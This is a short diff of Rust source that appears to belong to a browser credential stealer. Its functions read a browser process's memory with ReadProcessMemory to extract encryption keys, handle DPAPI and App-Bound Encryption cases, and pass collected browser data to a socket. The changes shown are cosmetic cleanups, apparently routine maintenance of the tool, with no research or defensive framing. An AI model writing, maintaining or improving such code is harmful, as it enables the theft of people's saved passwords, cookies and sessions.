@@ -624,7 +624,7 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig,
 }
 
 // find_target_address: browser_dbg.rs'den birebir kopyalandı
-unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void, browser_name: &str) -> usize {
+unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void, _browser_name: &str) -> usize {
     let mut dos_header: IMAGE_DOS_HEADER = zeroed();
     let mut bytes_read = 0;
     if ReadProcessMemory(h_process, base_addr, &mut dos_header as *mut _ as *mut _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
@@ -1000,7 +1000,7 @@ pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
     }
 
     let v10_key_res = get_v10_key(&user_data_dir);
-    let mut should_debug = config.has_abe;
+    let should_debug = config.has_abe;
 
     if let Some((key, is_dpapi)) = v10_key_res {
         if is_dpapi && !config.has_abe {
